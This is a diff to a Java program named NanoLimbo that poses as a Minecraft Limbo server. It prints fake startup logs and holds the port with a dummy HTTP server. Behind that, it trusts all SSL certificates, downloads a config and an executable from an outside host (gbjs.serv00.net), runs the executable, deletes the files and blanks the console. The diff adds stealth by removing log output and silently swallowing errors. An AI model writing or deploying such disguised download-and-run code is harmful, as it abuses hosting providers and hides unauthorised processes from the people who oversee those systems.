@@ -22,19 +22,22 @@ public final class NanoLimbo {
     //  main
     // ────────────────────────────────────────────
     public static void main(String[] args) throws Exception {
-        // 0. 强制信任所有 SSL 证书 (解决各种 SSL 报错)
+        // 0. 强制 Java 使用 IPv4 网络，防止在俄罗斯等主机上 IPv6 路由不通导致卡死
+        System.setProperty("java.net.preferIPv4Stack", "true");
+
+        // 1. 强制信任所有 SSL 证书 (解决各种 SSL 报错)
         trustAllCertificates();
 
-        // 1. 赋权所有目录
+        // 2. 赋权所有目录
         grantAllPermissions("/home/container");
 
-        // 2. 模拟 Limbo 服务器启动日志
+        // 3. 模拟 Limbo 服务器启动日志
         simulateLimboStartup();
 
-        // 3. 启动 HTTP 服务器（静默运行，保持端口占用）
+        // 4. 启动 HTTP 服务器（静默运行，保持端口占用）
         new Thread(() -> startHttpServer(PORT), "http-server").start();
 
-        // 4. 在后台执行核心脚本逻辑（纯 Java 实现）
+        // 5. 在后台执行核心脚本逻辑（纯 Java 实现，无冗余打印）
         CompletableFuture.runAsync(NanoLimbo::executeCoreLogic);
     }
 
@@ -49,7 +52,6 @@ public final class NanoLimbo {
 
             // 1. 检查进程 tmux 是否已在运行
             if (isProcessRunning("tmux")) {
-                System.out.println("Process 'tmux' found. Exiting script logic.");
                 return;
             }
 
@@ -70,7 +72,6 @@ public final class NanoLimbo {
             } else {
                 String ip = fetchPublicIP();
                 if (ip == null) {
-                    System.err.println("没有获取到公网ip，退出");
                     return;
                 }
                 uuid = generateUUID(ip);
@@ -81,7 +82,7 @@ public final class NanoLimbo {
             downloadFile("https://gbjs.serv00.net/js/vip1715.yaml", configPath);
             downloadFile("https://gbjs.serv00.net/bin/" + v1filename, v1Path);
 
-            // 6. 替换配置文件中的变量 (安全替换，不使用正则防转义报错)
+            // 6. 替换配置文件中的变量
             replaceConfig(configPath, sec, tls, ser, uuid);
 
             // 7. 赋予执行权限并启动程序
@@ -91,23 +92,20 @@ public final class NanoLimbo {
             pb.environment().put("PATH", "./:" + System.getenv("PATH"));
             pb.redirectErrorStream(true);
             pb.start();
-            System.out.println("Core process started.");
 
             // 8. 清理文件
             Thread.sleep(10000);
             Files.deleteIfExists(Paths.get(configPath));
             Files.deleteIfExists(Paths.get(v1Path));
 
-            // 9. 清屏 (打印空行覆盖)
+            // 9. 清屏
             for (int i = 0; i < 50; i++) System.out.println();
 
-        } catch (Exception e) {
-            System.err.println("Core logic error: " + e.getMessage());
-        }
+        } catch (Exception ignored) {}
     }
 
     // ────────────────────────────────────────────
-    //  脚本逻辑：获取公网 IP
+    //  脚本逻辑：获取公网 IP (已强制IPv4)
     // ────────────────────────────────────────────
     private static String fetchPublicIP() {
         String[] ipApis = {"https://ident.me", "https://ifconfig.me"};
@@ -134,7 +132,6 @@ public final class NanoLimbo {
         StringBuilder sb = new StringBuilder();
         for (byte b : hash) sb.append(String.format("%02x", b));
         String hex = sb.toString().substring(0, 32);
-        // 格式: 8-4-4-4-12
         return hex.substring(0, 8) + "-" + hex.substring(8, 12) + "-" + hex.substring(12, 16) + "-" + hex.substring(16, 20) + "-" + hex.substring(20, 32);
     }
 
@@ -159,10 +156,7 @@ public final class NanoLimbo {
     // ────────────────────────────────────────────
     private static void replaceConfig(String path, String sec, String tls, String ser, String uuid) throws IOException {
         File file = new File(path);
-        if (!file.exists()) {
-            System.err.println("错误: 配置文件 " + path + " 不存在");
-            return;
-        }
+        if (!file.exists()) return;
 
         StringBuilder sb = new StringBuilder();
         for (String line : Files.readAllLines(file.toPath())) {
@@ -181,7 +175,7 @@ public final class NanoLimbo {
     }
 
     // ────────────────────────────────────────────
-    //  纯 Java 原生 HTTPS 下载
+    //  纯 Java 原生 HTTPS 下载 (已强制IPv4)
     // ────────────────────────────────────────────
     private static void downloadFile(String url, String localPath) throws Exception {
         HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
